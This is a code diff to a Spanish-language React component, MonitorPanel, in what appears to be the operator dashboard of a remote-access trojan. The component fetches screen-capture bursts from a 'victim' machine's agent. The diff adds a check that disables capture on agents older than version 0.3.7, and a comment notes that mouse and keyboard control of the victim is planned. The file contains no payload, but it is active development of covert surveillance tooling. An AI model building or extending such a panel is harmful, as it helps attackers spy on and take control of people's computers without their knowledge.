@@ -7,6 +7,7 @@ import type { Task, Victim } from '@/lib/types';
 import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
 import { dateTime } from '@/lib/format';
+import { versionAtLeast } from '@/lib/actions';
 
 type Frame = { ts: number; data: string };
 
@@ -25,6 +26,7 @@ export function MonitorPanel({ victim }: { victim: Victim }) {
     refresh();
   }
 
+  const supported = versionAtLeast(victim.agentVersion, '0.3.7');
   const task = (data?.items ?? []).find((item) => item.status === 'done' && item.result);
   const frames = ((task?.result as { frames?: Frame[] } | null)?.frames ?? []).slice(0, 12);
   const running = (data?.items ?? []).find((item) => ['queued', 'running'].includes(item.status));
@@ -35,7 +37,7 @@ export function MonitorPanel({ victim }: { victim: Victim }) {
         <p className="text-2xs uppercase tracking-wide text-muted">Ráfaga de pantalla</p>
         <div className="flex gap-1">
           {running ? <Badge tone="warn">{running.status}</Badge> : null}
-          <Button size="sm" variant="secondary" disabled={!victim.socket || Boolean(running)} onClick={capture}><Monitor className="h-3 w-3" /> 5 s</Button>
+          <Button size="sm" variant="secondary" disabled={!victim.socket || Boolean(running) || !supported} onClick={capture}><Monitor className="h-3 w-3" /> 5 s</Button>
         </div>
       </div>
       {loading && frames.length === 0 ? <p className="py-6 text-center text-xs text-muted">Cargando…</p> : null}
@@ -52,6 +54,7 @@ export function MonitorPanel({ victim }: { victim: Victim }) {
         </div>
       )}
       {task ? <p className="mt-1 text-2xs text-muted">Última ráfaga {dateTime(task.finishedAt ?? task.createdAt)} · <Camera className="inline h-2.5 w-2.5" /> {frames.length} frames</p> : null}
+      {!supported ? <p className="mt-2 rounded border border-warn/30 bg-warn/10 p-2 text-2xs text-warn">El agente {victim.agentVersion || 'sin versión'} no tiene el módulo monitor; hace falta 0.3.7 o superior.</p> : null}
       <p className="mt-2 text-2xs text-muted/70">El control de ratón/teclado necesita el canal de entrada; queda para la siguiente iteración del módulo.</p>
     </div>
   );
